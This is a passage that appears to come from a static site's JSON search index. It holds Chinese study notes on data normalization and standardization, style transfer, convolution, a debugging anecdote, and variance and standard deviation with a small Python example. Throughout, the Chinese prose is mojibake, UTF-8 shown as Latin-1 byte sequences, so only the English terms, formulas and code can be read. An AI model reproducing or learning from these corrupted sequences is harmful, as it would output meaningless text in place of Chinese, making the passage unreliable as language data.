æˆ\"å¤±æ•ˆ\"ï¼Œåè€Œèƒ½æé«˜æ•°æ®çš„è¡¨ç°ï¼Œ è¿™äº›æ€§è´¨æ˜¯å½’ä¸€åŒ–/æ ‡å‡†åŒ–çš„å‰æã€‚ æ¯”å¦‚æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ€§è´¨ï¼šçº¿æ€§å˜æ¢ä¸ä¼šæ”¹å˜åŸå§‹æ•°æ®çš„æ•°å€¼æ’åºã€‚ ä¼˜ç‚¹ å½’ä¸€åŒ–/æ ‡å‡†åŒ–åå¯ä»¥åŠ å¿«æ¢¯åº¦ä¸‹é™çš„æ±‚è§£é€Ÿåº¦ é¿å…å±€éƒ¨å€¼åå·®å¤ªå¤§ å½’ä¸€åŒ– å½’ä¸€åŒ–ï¼ˆNormalizationï¼‰ å½’ä¸€åŒ–ä¸€èˆ¬æ˜¯å°†æ•°æ®æ˜ å°„åˆ°æŒ‡å®šçš„èŒƒå›´ï¼Œç”¨äºå»é™¤ä¸åŒç»´åº¦æ•°æ®çš„é‡çº²ä»¥åŠé‡çº²å•ä½ã€‚ åœ¨æœºå™¨å­¦ä¹ é¢†åŸŸä¸­ï¼Œä¸åŒè¯„ä»·æŒ‡æ ‡ï¼ˆå³ç‰¹å¾å‘é‡ä¸­çš„ä¸åŒç‰¹å¾å°±æ˜¯æ‰€è¿°çš„ä¸åŒè¯„ä»·æŒ‡æ ‡ï¼‰å¾€å¾€å…·æœ‰ä¸åŒçš„é‡çº²å’Œé‡çº²å•ä½ï¼Œè¿™æ ·çš„æƒ…å†µä¼šå½±å“åˆ°æ•°æ®åˆ†æçš„ç»“æœï¼Œ ä¸ºäº†æ¶ˆé™¤æŒ‡æ ‡ä¹‹é—´çš„é‡çº²å½±å“ï¼Œéœ€è¦è¿›è¡Œæ•°æ®æ ‡å‡†åŒ–å¤„ç†ï¼Œ ä»¥è§£å†³æ•°æ®æŒ‡æ ‡ä¹‹é—´çš„å¯æ¯”æ€§ã€‚åŸå§‹æ•°æ®ç»è¿‡æ•°æ®æ ‡å‡†åŒ–å¤„ç†åï¼Œ å„æŒ‡æ ‡å¤„äºåŒä¸€æ•°é‡çº§ï¼Œé€‚åˆè¿›è¡Œç»¼åˆå¯¹æ¯”è¯„ä»·ã€‚å…¶ä¸­ï¼Œæœ€å…¸å‹çš„å°±æ˜¯æ•°æ®çš„å½’ä¸€åŒ–å¤„ç†ã€‚ å¸¸è§çš„æ˜ å°„èŒƒå›´æœ‰ [0, 1] å’Œ [-1, 1] ï¼Œæœ€å¸¸è§çš„å½’ä¸€åŒ–æ–¹æ³•å°±æ˜¯ Min-Max å½’ä¸€åŒ–ã€‚ Min-Max å½’ä¸€åŒ– Min-Max å½’ä¸€åŒ–ï¼ˆMin-Max Normalizationï¼‰ ä¹Ÿç§°ä¸ºç¦»å·®æ ‡å‡†åŒ–ï¼Œæ˜¯å¯¹åŸå§‹æ•°æ®çš„çº¿æ€§å˜æ¢ï¼Œä½¿ç»“æœå€¼æ˜ å°„åˆ°[0 - 1]ä¹‹é—´ã€‚è½¬æ¢å‡½æ•°å¦‚ä¸‹ï¼š å…¶ä¸­maxä¸ºæ ·æœ¬æ•°æ®çš„æœ€å¤§å€¼ï¼Œminä¸ºæ ·æœ¬æ•°æ®çš„æœ€å°å€¼ã€‚ è¿™ç§å½’ä¸€åŒ–æ–¹æ³•æ¯”è¾ƒé€‚ç”¨åœ¨æ•°å€¼æ¯”è¾ƒé›†ä¸­çš„æƒ…å†µã€‚ ä½†æ˜¯ï¼Œå¦‚æœmaxå’Œminä¸ç¨³å®šï¼Œå¾ˆå®¹æ˜“ä½¿å¾—å½’ä¸€åŒ–ç»“æœä¸ç¨³å®šï¼Œä½¿å¾—åç»­ä½¿ç”¨æ•ˆæœä¹Ÿä¸ç¨³å®šï¼Œ å®é™…ä½¿ç”¨ä¸­å¯ä»¥ç”¨ç»éªŒå¸¸é‡å€¼æ¥æ›¿ä»£maxå’Œminã€‚ è€Œä¸”å½“æœ‰æ–°æ•°æ®åŠ å…¥æ—¶ï¼Œå¯èƒ½å¯¼è‡´maxå’Œminçš„å˜åŒ–ï¼Œéœ€è¦é‡æ–°å®šä¹‰ã€‚ ä½œç”¨ï¼š æ•°æ®æ˜ å°„åˆ°æŒ‡å®šçš„èŒƒå›´å†…è¿›è¡Œå¤„ç†ï¼Œæ›´åŠ ä¾¿æ·å¿«é€Ÿã€‚ æŠŠæœ‰é‡çº²è¡¨è¾¾å¼å˜æˆæ— é‡çº²è¡¨è¾¾å¼ï¼Œä¾¿äºä¸åŒå•ä½æˆ–é‡çº§çš„æŒ‡æ ‡èƒ½å¤Ÿè¿›è¡Œæ¯”è¾ƒå’ŒåŠ æƒã€‚ ç»è¿‡å½’ä¸€åŒ–åï¼Œå°†æœ‰é‡çº²çš„æ•°æ®é›†å˜æˆçº¯é‡ï¼Œè¿˜å¯ä»¥è¾¾åˆ°ç®€åŒ–è®¡ç®—çš„ä½œç”¨ã€‚ æ³¨è§£ æœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›å°†è¾“å…¥è½¬æ¢åˆ°[-1,1]çš„èŒƒå›´ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å…¬å¼: å®è´¨ä¸Šï¼Œå½’ä¸€åŒ–çš„ä¸€èˆ¬è§„èŒƒå‡½æ•°æ˜¯: y = (ymax-ymin)*(x-xmin)/(xmax-xmin) + yminã€‚ æ ‡å‡†åŒ– æ ‡å‡†åŒ–ï¼ˆNormalizationï¼‰ æ³¨è§£ å½’ä¸€åŒ–å’Œæ ‡å‡†åŒ–çš„è‹±æ–‡ç¿»è¯‘æ˜¯ä¸€è‡´çš„ï¼Œä½†æ˜¯æ ¹æ®å…¶ç”¨é€”ï¼ˆæˆ–å…¬å¼ï¼‰çš„ä¸åŒå»ç†è§£ï¼ˆæˆ–ç¿»è¯‘ï¼‰ æ ‡å‡†åŒ–æ˜¯ä¾ç…§ç‰¹å¾çŸ©é˜µçš„åˆ—å¤„ç†æ•°æ®ã€‚ æ•°æ®æ ‡å‡†åŒ–æ–¹æ³•æœ‰å¤šç§ï¼Œ å¦‚ï¼šç›´çº¿å‹æ–¹æ³•(å¦‚æå€¼æ³•ã€æ ‡å‡†å·®æ³•)ã€æŠ˜çº¿å‹æ–¹æ³•(å¦‚ä¸‰æŠ˜çº¿æ³•)ã€æ›²çº¿å‹æ–¹æ³•(å¦‚åŠæ­£æ€æ€§åˆ†å¸ƒ)ã€‚ ä¸åŒçš„æ ‡å‡†åŒ–æ–¹æ³•ï¼Œå¯¹ç³»ç»Ÿçš„è¯„ä»·ç»“æœä¼šäº§ç”Ÿä¸åŒçš„å½±å“ã€‚å…¶ä¸­ï¼Œæœ€å¸¸ç”¨çš„æ˜¯Z-Score æ ‡å‡†åŒ–ã€‚ Z-Score æ ‡å‡†åŒ– Z-Score æ ‡å‡†åŒ–ï¼ˆZ-Score Normalizationï¼‰ è¿™ç§æ–¹æ³•ç»™äºˆåŸå§‹æ•°æ®çš„å‡å€¼ï¼ˆmeanï¼‰å’Œæ ‡å‡†å·®ï¼ˆstandard deviationï¼‰è¿›è¡Œæ•°æ®çš„æ ‡å‡†åŒ–ã€‚ ç»è¿‡å¤„ç†çš„æ•°æ®ç¬¦åˆæ ‡å‡†æ­£æ€åˆ†å¸ƒï¼Œå³å‡å€¼ä¸º0ï¼Œæ ‡å‡†å·®ä¸º1ï¼Œè½¬åŒ–å‡½æ•°ä¸º å…¶ä¸­ u æ˜¯æ ·æœ¬æ•°æ®çš„å‡å€¼ï¼ˆmeanï¼‰ï¼Œ o æ˜¯æ ·æœ¬æ•°æ®çš„æ ‡å‡†å·®ï¼ˆstdï¼‰ã€‚ æ­¤å¤–ï¼Œæ ‡å‡†åŒ–åçš„æ•°æ®ä¿æŒå¼‚å¸¸å€¼ä¸­çš„æœ‰ç”¨ä¿¡æ¯ï¼Œ ä½¿å¾—ç®—æ³•å¯¹å¼‚å¸¸å€¼ä¸å¤ªæ•æ„Ÿï¼Œè¿™ä¸€ç‚¹å½’ä¸€åŒ–å°±æ— æ³•ä¿è¯ã€‚ ä½œç”¨: æå‡æ¨¡å‹çš„æ”¶æ•›é€Ÿåº¦ï¼ˆåŠ å¿«æ¢¯åº¦ä¸‹é™çš„æ±‚è§£é€Ÿåº¦ï¼‰ æå‡æ¨¡å‹çš„ç²¾åº¦ï¼ˆæ¶ˆé™¤é‡çº§å’Œé‡çº²çš„å½±å“ï¼‰ ç®€åŒ–è®¡ç®—ï¼ˆä¸å½’ä¸€åŒ–çš„ç®€åŒ–åŸç†ç›¸åŒï¼‰ å½’ä¸€åŒ–å’Œæ ‡å‡†åŒ–çš„å¼‚åŒ åŒºåˆ« å½’ä¸€åŒ–æ˜¯å°†æ ·æœ¬çš„ç‰¹å¾å€¼è½¬æ¢åˆ°åŒä¸€é‡çº²ä¸‹æŠŠæ•°æ®æ˜ å°„åˆ°[0,1]æˆ–è€…[-1, 1]åŒºé—´å†…ï¼Œ ä»…ç”±å˜é‡çš„æå€¼å†³å®šï¼Œå› åŒºé—´æ”¾ç¼©æ³•æ˜¯å½’ä¸€åŒ–çš„ä¸€ç§ã€‚ æ ‡å‡†åŒ–æ˜¯ä¾ç…§ç‰¹å¾çŸ©é˜µçš„åˆ—å¤„ç†æ•°æ®ï¼Œå…¶é€šè¿‡æ±‚z-scoreçš„æ–¹æ³•ï¼Œ è½¬æ¢ä¸ºæ ‡å‡†æ­£æ€åˆ†å¸ƒï¼Œå’Œæ•´ä½“æ ·æœ¬åˆ†å¸ƒç›¸å…³ï¼Œæ¯ä¸ªæ ·æœ¬ç‚¹éƒ½èƒ½å¯¹æ ‡å‡†åŒ–äº§ç”Ÿå½±å“ã€‚ ç›¸åŒ å®ƒä»¬çš„ç›¸åŒç‚¹åœ¨äºéƒ½èƒ½å–æ¶ˆç”±äºé‡çº²ä¸åŒå¼•èµ·çš„è¯¯å·®ï¼› éƒ½æ˜¯ä¸€ç§çº¿æ€§å˜æ¢ï¼Œéƒ½æ˜¯å¯¹å‘é‡XæŒ‰ç…§æ¯”ä¾‹å‹ç¼©å†è¿›è¡Œå¹³ç§»ã€‚ å½’ä¸€åŒ–å’Œæ ‡å‡†åŒ–çš„é€‚ç”¨åœºæ™¯ æ•°æ®çš„åˆ†å¸ƒæœ¬èº«å°±æœä»æ­£æ€åˆ†å¸ƒï¼Œä½¿ç”¨Z-Scoreæ ‡å‡†åŒ– æœ‰ç¦»ç¾¤å€¼çš„æƒ…å†µï¼šä½¿ç”¨Z-Score è¿™é‡Œä¸æ˜¯è¯´æœ‰ç¦»ç¾¤å€¼æ—¶ä½¿ç”¨Z-Scoreä¸å—å½±å“ï¼Œ è€Œæ˜¯ï¼ŒMin-Maxå¯¹äºç¦»ç¾¤å€¼ååˆ†æ•æ„Ÿï¼Œå› ä¸ºç¦»ç¾¤å€¼çš„å‡ºç°ï¼Œ ä¼šå½±å“æ•°æ®ä¸­maxæˆ–minå€¼ï¼Œä»è€Œä½¿Min-Maxçš„æ•ˆæœå¾ˆå·®ã€‚ ç›¸æ¯”ä¹‹ä¸‹ï¼Œè™½ç„¶ä½¿ç”¨Z-Scoreè®¡ç®—æ–¹å·®å’Œå‡å€¼çš„æ—¶å€™ä»ç„¶ä¼šå—åˆ°ç¦»ç¾¤å€¼çš„å½±å“ï¼Œ ä½†æ˜¯ç›¸æ¯”äºMin-Maxæ³•ï¼Œå½±å“ä¼šå°ä¸€ç‚¹ å¦‚æœå¯¹è¾“å‡ºç»“æœèŒƒå›´æœ‰è¦æ±‚ï¼Œç”¨å½’ä¸€åŒ– å¦‚æœæ•°æ®è¾ƒä¸ºç¨³å®šï¼Œä¸å­˜åœ¨æç«¯çš„æœ€å¤§æœ€å°å€¼ï¼Œç”¨å½’ä¸€åŒ– å¦‚æœæ•°æ®å­˜åœ¨å¼‚å¸¸å€¼å’Œè¾ƒå¤šå™ªéŸ³ï¼Œç”¨æ ‡å‡†åŒ–ï¼Œå¯ä»¥é—´æ¥é€šè¿‡ä¸­å¿ƒåŒ–é¿å…å¼‚å¸¸å€¼å’Œæç«¯å€¼çš„å½±å“ éçº¿æ€§å˜æ¢ éçº¿æ€§å˜æ¢ç»å¸¸ç”¨åœ¨æ•°æ®åˆ†åŒ–æ¯”è¾ƒå¤§çš„åœºæ™¯ï¼Œæœ‰äº›æ•°å€¼å¾ˆå¤§ï¼Œæœ‰äº›å¾ˆå°ã€‚é€šè¿‡ä¸€äº›æ•°å­¦å‡½æ•°ï¼Œå°†åŸå§‹å€¼è¿›è¡Œæ˜ å°„ã€‚è¯¥æ–¹æ³•åŒ…æ‹¬ logã€æŒ‡æ•°ï¼Œæ­£åˆ‡ç­‰ã€‚éœ€è¦æ ¹æ®æ•°æ®åˆ†å¸ƒçš„æƒ…å†µï¼Œå†³å®šéçº¿æ€§å‡½æ•°çš„æ›²çº¿ï¼Œæ¯”å¦‚log(V, 2)è¿˜æ˜¯log(V, 10)ç­‰ã€‚ å¯¹æ•°å‡½æ•°è½¬æ¢: y = log10(x) åä½™åˆ‡å‡½æ•°è½¬æ¢: y = atan(x) * 2 / Ï€ å‚è€ƒ:: æ•°æ®é¢„å¤„ç†ï¼šå½’ä¸€åŒ–å’Œæ ‡å‡†åŒ– å¦‚ä½•ç†è§£å½’ä¸€åŒ–ï¼ˆnormalizationï¼‰","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Pre--processing.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Pre--processing.html"},{"title":"é£æ ¼è¿ç§»","text":"éš¶å±äºå›¾åƒæ“ä½œ æ³¨è§£ æ—¶éš”ä¸¤å¹´, å·²ç»å¿˜äº†è¿™äº›ä¸œè¥¿æ˜¯å•¥ç©æ„å„¿äº† ä»£ä»·å‡½æ•°å®šä¹‰ å›¾ç‰‡ä¸€ Cï¼Œ å›¾ç‰‡äºŒ Sï¼Œ é£æ ¼è¿ç§»åçš„å›¾ç‰‡ G å†…å®¹ä»£ä»·å‡½æ•° é£æ ¼ä»£ä»·å‡½æ•° æ³¨ï¼š i, j, k è¡¨ç¤ºé«˜ï¼Œå®½ï¼Œé€šé“ æ€»ä»£ä»·å‡½æ•° æ›´æ–°çš„æ˜¯ç”Ÿæˆå›¾åƒçš„åƒç´ ç‚¹çš„å€¼","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Style-migration.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Style-migration.html"},{"title":"æ·±åº¦å­¦ä¹ ","text":"è´å¶æ–¯ é£æ ¼è¿ç§» å¡å°”æ›¼æ»¤æ³¢ æ¨¡å‹è®­ç»ƒå¯è§†åŒ–æ¨¡å— äººè„¸è¯†åˆ« å›¾åƒè¯†åˆ« è‡ªç„¶è¯­è¨€å¤„ç† DNN æ•°æ®é¢„å¤„ç† å·ç§¯ ä¿¡å·åˆ†æ ä¸€ä¸ªè¾“å…¥ä¿¡å·f(t)ï¼Œç»è¿‡ä¸€ä¸ªçº¿æ€§ç³»ç»Ÿï¼ˆå…¶ç‰¹å¾å¯ä»¥ç”¨å•ä½å†²å‡»å“åº”å‡½æ•°g(t)æè¿°ï¼‰ä»¥åï¼Œ è¾“å‡ºä¿¡å·åº”è¯¥æ˜¯ä»€ä¹ˆï¼Ÿå®é™…ä¸Šé€šè¿‡å·ç§¯è¿ç®—å°±å¯ä»¥å¾—åˆ°è¾“å‡ºä¿¡å·ã€‚ å›¾åƒå¤„ç† è¾“å…¥ä¸€å¹…å›¾åƒf(x,y)ï¼Œç»è¿‡ç‰¹å®šè®¾è®¡çš„å·ç§¯æ ¸g(x,y)è¿›è¡Œå·ç§¯å¤„ç†ä»¥åï¼Œè¾“å‡ºå›¾åƒå°†ä¼šå¾—åˆ°æ¨¡ç³Šï¼Œè¾¹ç¼˜å¼ºåŒ–ç­‰å„ç§æ•ˆæœã€‚ å·ç§¯çš„\"å·\"ï¼ŒæŒ‡çš„çš„å‡½æ•°çš„ç¿»è½¬ï¼Œä» g(t) å˜æˆ g(-t) çš„è¿™ä¸ªè¿‡ç¨‹ï¼› åŒæ—¶ï¼Œ\"å·\"è¿˜æœ‰æ»‘åŠ¨çš„æ„å‘³åœ¨é‡Œé¢ï¼ˆå¸å–äº†ç½‘å‹ææ–‡æ¸…çš„å»ºè®®ï¼‰ã€‚ å¦‚æœæŠŠå·ç§¯ç¿»è¯‘ä¸º\"è¤¶ç§¯\"ï¼Œé‚£ä¹ˆè¿™ä¸ª\"è¤¶\"å­—å°±åªæœ‰ç¿»è½¬çš„å«ä¹‰äº†ã€‚ å·ç§¯çš„\"ç§¯\"ï¼ŒæŒ‡çš„æ˜¯ç§¯åˆ†/åŠ æƒæ±‚å’Œã€‚ å¯¹å·ç§¯çš„æ„ä¹‰çš„ç†è§£ï¼š ä»\"ç§¯\"çš„è¿‡ç¨‹å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¾—åˆ°çš„å åŠ å€¼ï¼Œæ˜¯ä¸ªå…¨å±€çš„æ¦‚å¿µã€‚ ä»¥ä¿¡å·åˆ†æä¸ºä¾‹ï¼Œå·ç§¯çš„ç»“æœæ˜¯ä¸ä»…è·Ÿå½“å‰æ—¶åˆ»è¾“å…¥ä¿¡å·çš„å“åº”å€¼æœ‰å…³ï¼Œ ä¹Ÿè·Ÿè¿‡å»æ‰€æœ‰æ—¶åˆ»è¾“å…¥ä¿¡å·çš„å“åº”éƒ½æœ‰å…³ç³»ï¼Œè€ƒè™‘äº†å¯¹è¿‡å»çš„æ‰€æœ‰è¾“å…¥çš„æ•ˆæœçš„ç´¯ç§¯ã€‚ åœ¨å›¾åƒå¤„ç†çš„ä¸­ï¼Œå·ç§¯å¤„ç†çš„ç»“æœï¼Œå…¶å®å°±æ˜¯æŠŠæ¯ä¸ªåƒç´ å‘¨è¾¹çš„ï¼Œ ç”šè‡³æ˜¯æ•´ä¸ªå›¾åƒçš„åƒç´ éƒ½è€ƒè™‘è¿›æ¥ï¼Œå¯¹å½“å‰åƒç´ è¿›è¡ŒæŸç§åŠ æƒå¤„ç†ã€‚ æ‰€ä»¥è¯´ï¼Œ\"ç§¯\"æ˜¯å…¨å±€æ¦‚å¿µï¼Œæˆ–è€…è¯´æ˜¯ä¸€ç§\"æ··åˆ\"ï¼ŒæŠŠä¸¤ä¸ªå‡½æ•°åœ¨æ—¶é—´æˆ–è€…ç©ºé—´ä¸Šè¿›è¡Œæ··åˆã€‚ é‚£ä¸ºä»€ä¹ˆè¦è¿›è¡Œ\"å·\"ï¼Ÿç›´æ¥ç›¸ä¹˜ä¸å¥½å—ï¼Ÿ è¿›è¡Œ\"å·\"ï¼ˆç¿»è½¬ï¼‰çš„ç›®çš„å…¶å®æ˜¯æ–½åŠ ä¸€ç§çº¦æŸï¼Œ å®ƒæŒ‡å®šäº†åœ¨\"ç§¯\"çš„æ—¶å€™ä»¥ä»€ä¹ˆä¸ºå‚ç…§ã€‚ åœ¨ä¿¡å·åˆ†æçš„åœºæ™¯ï¼Œå®ƒæŒ‡å®šäº†åœ¨å“ªä¸ªç‰¹å®šæ—¶é—´ç‚¹çš„å‰åè¿›è¡Œ\"ç§¯\"ï¼Œ åœ¨ç©ºé—´åˆ†æçš„åœºæ™¯ï¼Œå®ƒæŒ‡å®šäº†åœ¨å“ªä¸ªä½ç½®çš„å‘¨è¾¹è¿›è¡Œç´¯ç§¯å¤„ç†ã€‚ å‚è€ƒ: å¦‚ä½•é€šä¿—æ˜“æ‡‚åœ°è§£é‡Šå·ç§¯ï¼Ÿ æœ¬åœ°PDF: ../../../resources/pdf/å¦‚ä½•é€šä¿—æ˜“æ‡‚åœ°è§£é‡Šå·ç§¯ï¼Ÿ - çŸ¥ä¹.pdf ä¸€æ¬¡é‡æ„è‡ªå·±çš„ä¸€ä¸ªDNNæ¨¡å‹å‘ç°çš„é—®é¢˜ äº¤å‰å¢’æŸå¤±å‡½æ•°å¼•èµ·çš„bug é‡æ„çš„æ—¶å€™å‘ç°ä¸€ä¸ªbug æ„Ÿè§‰æ˜¯pythonåº•å±‚è§£ææ‰§è¡Œçš„é—®é¢˜ï¼Œå‘é‡åŒ–è®¡ç®—ä¼šå¤±è´¥, å‡ºbugä»£ç  å‘é‡åŒ–çš„è®¡ç®—ç»“æœä¸å®é™…ä¸ä¸€è‡´ bugç¤ºä¾‹ï¼Œéƒ¨åˆ†æˆªå›¾ æœ‰æ„æ€çš„æ˜¯ï¼Œä¸“é—¨å†™äº†ä¸€ä¸ªæµ‹è¯•æŠŠåŸæœ‰æ•°æ®æ‹¿å»æµ‹è¯•ï¼Œå±…ç„¶å¤ç°ä¸å‡º æ’æŸ¥åˆ°å‡Œæ™¨ï¼Œå‘ç°æ˜¯è¿™ä¸ªé—®é¢˜ã€‚ã€‚ã€‚å…·ä½“åŸå› è¿˜æ²¡æ‰¾åˆ°ï¼Œåªæ‰¾åˆ°bugç‚¹ã€‚ å…ˆè®°å½•ä¸€ä¸‹ï¼Œä»¥åå†ç ”ç©¶","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-index.html","loc":"/yq-doc-source-docs-AI-Deep-learning-index.html"},{"title":"æ–¹å·®ä¸æ ‡å‡†å·®","text":"æ–¹å·®å’Œæ ‡å‡†å·®éƒ½æ˜¯ç”¨æ¥åº¦é‡æ•°æ®çš„ç¦»æ•£ç¨‹åº¦ï¼Œå³è¡¨å¾ä¸€ç»„æ•°æ®åˆ†å¸ƒæƒ…å†µçš„ç»Ÿè®¡é‡ã€‚ æ–¹å·®(variance) æ‰€æœ‰æ•°æ®ä¸å‡å€¼ä¹‹å·®çš„å¹³æ–¹å’Œçš„å¹³å‡å€¼ï¼Œ å®ƒåæ˜ äº†æ•°æ®çš„æ³¢åŠ¨ç¨‹åº¦ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æè¿°ä¸€ä¸ªéšæœºå˜é‡çš„åˆ†å¸ƒæƒ…å†µã€‚ é€šä¿—åœ°æ¥è®²ï¼Œ æ–¹å·®è¶Šå¤§ï¼Œæ•°æ®çš„æ³¢åŠ¨å°±è¶Šå‰§çƒˆï¼Œè¯´æ˜æ•°æ®ä¹‹é—´çš„å·®å¼‚è¶Šå¤§ï¼› æ–¹å·®è¶Šå°ï¼Œæ•°æ®çš„æ³¢åŠ¨å°±è¶Šå¹³ç¨³ï¼Œè¯´æ˜æ•°æ®ä¹‹é—´çš„å·®å¼‚è¶Šå°ã€‚ ä¸ºä»€ä¹ˆå–å¹³æ–¹ï¼Ÿ å› ä¸ºéšæœºå€¼å’Œå‡å€¼æ¯”è¾ƒå‡ºç°è´Ÿåå·®çš„æ—¶å€™ï¼Œ è¦å–åæ‰èƒ½å’Œå…¶ä»–å€¼æ¯”è¾ƒï¼Œä¸ºäº†æ¯”è¾ƒæ–¹ä¾¿ï¼Œç»Ÿä¸€å–å¹³æ–¹å€¼è¿›è¡Œæ¯”è¾ƒ. ä¸ç”¨ç»å¯¹å€¼, æ˜¯å› ä¸ºç»å¯¹å€¼ä¸å¯å¯¼, æ²¡æ³•æ±‚ç§¯åˆ†(ç°åœ¨æ•°å­¦ç•Œå•¥éƒ½è¦ç§¯åˆ†å¯å¯¼) æ ‡å‡†å·®(standard deviation) æ–¹å·®çš„å¹³æ–¹æ ¹ï¼Œå®ƒä¹Ÿæ˜¯ç”¨æ¥è¡¡é‡æ•°æ®çš„ç¦»æ•£ç¨‹åº¦ï¼Œ ä½†æ›´ç›´è§‚åœ°åæ˜ äº†æ•°æ®ä¸å‡å€¼ä¹‹é—´çš„è·ç¦»ï¼Œå³æ•°æ®çš„ç¦»æ•£ç¨‹åº¦ã€‚ æ ‡å‡†å·®è¶Šå¤§ï¼Œæ•°æ®çš„æ³¢åŠ¨å°±è¶Šå¤§ï¼Œè¯´æ˜æ•°æ®ä¹‹é—´çš„å·®å¼‚è¶Šå¤§ï¼› æ ‡å‡†å·®è¶Šå°ï¼Œæ•°æ®çš„æ³¢åŠ¨å°±è¶Šå°ï¼Œè¯´æ˜æ•°æ®ä¹‹é—´çš„å·®å¼‚è¶Šå°ã€‚ å› æ­¤ï¼Œå¯ä»¥é€šè¿‡æ ‡å‡†å·®æ¥åˆ¤æ–­æ•°æ®é›†ä¸­çš„æ•°æ®ç‚¹è·ç¦»å‡å€¼çš„ç¨‹åº¦ï¼Œ è¿›è€Œå¯¹æ•°æ®çš„åˆ†å¸ƒæƒ…å†µå’Œå˜åŒ–è¶‹åŠ¿è¿›è¡Œåˆ†æå’Œè§£é‡Šã€‚ ä¸ºä»€ä¹ˆéœ€è¦æ ‡å‡†å·®? å¯ä»¥ç®€å•çš„ç†è§£ä¸º, æ–¹å·®å¦‚æœå¸¦ä¸Šå•ä½, ä¹ŸæŠŠå•ä½ç»™å¹³æ–¹äº†, æ¯”å¦‚ å•ä½æ˜¯m, æ–¹å·®å› ä¸ºä¼šçƒå¹³æ–¹, å•ä½å°±å˜æˆäº† m&#94;2, å¼€ä¸ªæ ¹å·åˆ©äº ä¸åŸæ¥çš„æ•°æ® xxx m æ¯”è¾ƒ. æ ‡å‡†å·®å’Œå‡å€¼çš„é‡çº²ï¼ˆå•ä½ï¼‰æ˜¯ä¸€è‡´çš„ï¼Œåœ¨æè¿°ä¸€ä¸ªæ³¢åŠ¨èŒƒå›´æ—¶æ ‡å‡†å·®æ¯”æ–¹å·®æ›´æ–¹ä¾¿ã€‚ æ¯”å¦‚ä¸€ä¸ªç­ç”·ç”Ÿçš„å¹³å‡èº«é«˜æ˜¯170cm,æ ‡å‡†å·®æ˜¯10cm,é‚£ä¹ˆæ–¹å·®å°±æ˜¯100cm&#94;2ã€‚ å¯ä»¥è¿›è¡Œçš„æ¯”è¾ƒç®€ä¾¿çš„æè¿°æ˜¯æœ¬ç­ç”·ç”Ÿèº«é«˜åˆ†å¸ƒæ˜¯170Â±10cmï¼Œæ–¹å·®å°±æ— æ³•åšåˆ°è¿™ç‚¹ã€‚ è¿™ä¹ˆè¯´å¯æˆ–è®¸ä¸å‡†ç¡®, é‚£æ¢ç§è¯´æ³•: å‡å®šè¿™ä¸ªç­ç”·ç”Ÿçš„èº«é«˜æœä»æ­£æ€åˆ†å¸ƒï¼Œ åˆ™æœ‰68.3%çš„ç”·ç”Ÿèº«é«˜è½åœ¨170Â±10cmè¿™ä¸ªåŒºé—´å†…ã€‚ å³: æ­£æ€åˆ†å¸ƒä¸­: P{Î¼-Ïƒ<X<Î¼+Ïƒ}=68.3%ï¼ŒåŒç†P{Î¼-2Ïƒ<X<Î¼+2Ïƒ}=95.4%ï¼ŒP{Î¼-3Ïƒ<X<Î¼+3Ïƒ}=99.7% # å‡å¯åœ¨æ­£æ€åˆ†å¸ƒæ¦‚ç‡è¡¨æ ¼ä¸­æŸ¥è¯¢ã€‚å¸Œæœ›æœ‰å¸®åŠ©ã€‚ å†ä¸¾ä¸ªä¾‹å­ï¼Œä»æ­£æ€åˆ†å¸ƒä¸­æŠ½å‡ºçš„ä¸€ä¸ªæ ·æœ¬è½åœ¨[Î¼-3Ïƒ, Î¼+3Ïƒ]è¿™ä¸ªèŒƒå›´å†…çš„æ¦‚ç‡æ˜¯99.7%ï¼Œ ä¹Ÿå¯ä»¥ç§°ä¸º\"æ­£è´Ÿ3ä¸ªæ ‡å‡†å·®\"ã€‚å¦‚æœæ²¡æœ‰æ ‡å‡†å·®è¿™ä¸ªæ¦‚å¿µï¼Œ æˆ‘ä»¬ä½¿ç”¨æ–¹å·®æ¥æè¿°è¿™ä¸ªèŒƒå›´å°±ç•¥å¾®ç»•äº†ä¸€ç‚¹ã€‚ ä¸‡ä¸€è¿™ä¸ªåˆ†å¸ƒæ˜¯æœ‰å®é™…èƒŒæ™¯çš„ï¼Œè¿™ä¸ªèŒƒå›´æè¿°è¿˜è¦åŠ ä¸Šä¸€ä¸ªå•ä½ï¼Œ è¿™æ—¶å€™ä¸ºäº†æ–¹ä¾¿ï¼Œäººä»¬å°±è‡ªç„¶è€Œç„¶åœ°å°†è¿™ä¸ªé‡å•ç‹¬æå–å‡ºæ¥äº†ã€‚ æ–¹å·®å’Œæ ‡å‡†å·®çš„åŒºåˆ« æ–¹å·®åªæœ‰æ¯”è¾ƒæ„ä¹‰ï¼Œæ²¡æœ‰æ•°å­—æ„ä¹‰ï¼› æ ‡å‡†å·®æ—¢æœ‰æ¯”è¾ƒæ„ä¹‰ï¼Œä¹Ÿæœ‰æ•°å­—æ„ä¹‰ã€‚ ä¸ºä»€ä¹ˆè¦é€šè¿‡æ–¹å·®æ¥è®¡ç®—æ ‡å‡†å·®ï¼Ÿ æ˜æ˜æ˜¯æ ¹æ®æ ‡å‡†å·®çš„æ„ä¹‰æ¨å¯¼å‡ºçš„æ–¹å·®ï¼Œ ç°åœ¨è®¡ç®—æ ‡å‡†å·®ï¼Œå´è¦å…ˆç®—æ–¹å·®ï¼Ÿæ˜æ˜æ˜¯æˆ‘å…ˆæ¥çš„ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿ å› ä¸ºè®¡ç®—æ–¹ä¾¿ï¼Œä¸ç”¨è€ƒè™‘ä¸åŒæ ·æœ¬å€¼å’Œå‡å€¼çš„æ­£è´Ÿæ¯”è¾ƒå’Œå–åï¼Œå…·æœ‰æ™®éæ€§ã€‚ ç¤ºä¾‹: import math def variance(data): n = len(data) mean = sum(data) / n deviations = [(x - mean) ** 2 for x in data] variance = sum(deviations) / n return variance def stdev(data): return math.sqrt(variance(data)) data = [1, 2, 3, 4, 5] print(\"æ•°æ®é›†ï¼š\", data) print(\"æ–¹å·®ï¼š\", variance(data)) print(\"æ ‡å‡†å·®ï¼š\", 